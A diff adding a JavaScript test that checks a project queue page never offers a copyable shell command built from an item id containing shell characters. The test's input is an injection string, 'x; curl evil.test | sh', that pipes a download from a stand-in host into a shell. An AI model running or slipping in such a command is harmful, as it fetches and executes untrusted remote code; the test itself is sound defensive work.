@@ -1560,6 +1560,22 @@ describe('waiting on you', () => {
     expect(body).toContain('id="d-decide-title">Decide<');
   });
 
+  it('never offers a command built from an id with shell characters in it', async () => {
+    // The id is whatever the item's own file says, and Copy puts it where a
+    // terminal will run it. Somebody who can write to the repository can write that.
+    const hostile = 'x; curl evil.test | sh';
+    queue(hostile, { id: hostile, summary: 'a proposal with an odd id' });
+    const { body } = await visit('/project/acme/ledger', MANAGER);
+    expect(body).toContain('a proposal with an odd id');
+    // The id still names the item to an assistant, quoted; what must not exist is a command.
+    expect(body).not.toMatch(/review (approve|reject) x/);
+    // Found by what it says, since the id is not safe to build a pattern from.
+    const mine = new RegExp('<div class="q[^"]*" id="r-[^"]*"[^>]*data-text="a proposal with an odd id"[\\s\\S]*?\\n</div>').exec(body)?.[0];
+    const lines = dataOf(mine, 'decide');
+    expect(lines.filter(l => l.text)).toEqual([]);
+    expect(lines.map(l => l.note).join(' ')).toMatch(/command line .*not shown/i);
+  });
+
   it('names an item with no number by what it says', async () => {
     queue('c-unnumbered', { summary: 'An unnumbered proposal', workstream: null });
     const [how] = dataOf(item((await visit('/project/acme/ledger', MANAGER)).body, 'c-unnumbered'), 'decide');
